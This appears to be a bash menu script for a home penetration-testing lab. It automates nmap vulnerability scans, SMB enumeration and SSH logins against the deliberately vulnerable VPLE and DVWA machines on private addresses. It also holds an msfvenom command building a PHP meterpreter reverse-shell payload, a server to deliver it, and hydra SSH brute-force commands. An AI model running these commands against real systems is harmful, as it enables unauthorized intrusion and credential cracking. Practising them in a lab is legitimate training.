##BISMILLAH

echo "Enableing all services and do the same thisng in VPLE"
service mysql start
service apache2 start
service smbd start
service nmbd start
sevice ssh start

figlet "My Custom Script" 


echo [+] " 1) Ip"
echo [+] " 2) Nmap First Command "
echo [+] " 3) Nmap Second Command "
echo [+] " 4) Nmap Third Command "
echo [+] " 5) SMB First Command "
echo [+] " 6) SMB Second Command "
echo [+] " 7) Access Wordpress Site "
echo [+] " 8) MSF-venom for PHP "
echo [+] " 9) Python Server "
echo [+] " 10) MSFCONSOLE "
echo [+] " 11) ssh login VPLE "
echo [+] " 12) Log in to DVWA "
echo [+] " 13) BURPSUITE "
echo [+] " 14) HYDRA-BRUTEFORCE-VPLE"
echo [+] " 15) HYDRA-BURTEFORCE-KALI"

echo [+] " Enter the number you want to perform the attack "
for((i=0;i<16;i++))
do	
read n
if((n==1));
then
	echo $(ifconfig)
elif((n==2));
then
        nmap 192.168.57.129 -p- --min-rate 20000
elif((n==3));
then
        nmap -sCV 192.168.57.129
elif((n==4));
then	
        nmap -sV -sC --script=vuln -v 192.168.57.129	
elif((n==5));
then
       smbclient -L \\\\192.168.57.129
elif((n==6));
then	
        smbclient \\\\192.168.57.129\\ahad34	
elif((n==7));
then 
        firefox localhost 
elif((n==8));
then
     msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.57.128 lport=443 -f raw > ahad34.php	     
elif((n==9));
then
     echo " Make sure python script is the curent folder"
     python -m http.server 8081	

elif((n==10));
then
     msfconsole

elif((n==11));
then
      echo " Make sure you have started VPLE and all the sevices in VPLE"
      
      sudo ssh -p 22  administrator@192.168.57.129
     
elif((n==12));
then
       firefox 192.168.57.129:1335 	

elif((n==13));
then
       $(burpsuite)
elif((n==14));
then
	echo " Make sure you have a started the ssh service and you have a password.txt file"
        hydra -l administrator -P password.txt -T 20 192.168.57.129 ssh
elif((n==15));
then
	echo "Make sure you have a started the ssh service and you have a password.txt file"
       hydra -l ahad -P password.txt -T 20 192.168.57.128 ssh	
fi


done
